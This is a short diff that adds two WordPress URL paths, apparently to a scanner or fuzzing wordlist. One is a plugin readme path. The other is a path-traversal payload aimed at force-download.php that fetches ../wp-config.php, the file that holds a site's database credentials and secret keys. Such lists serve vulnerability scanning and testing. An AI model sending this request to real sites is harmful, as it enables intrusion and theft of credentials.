@@ -1,0 +1,2 @@
+/wp-content/plugins/uix-shortcodes/readme.txt
+/wp-content/force-download.php?file=../wp-config.php
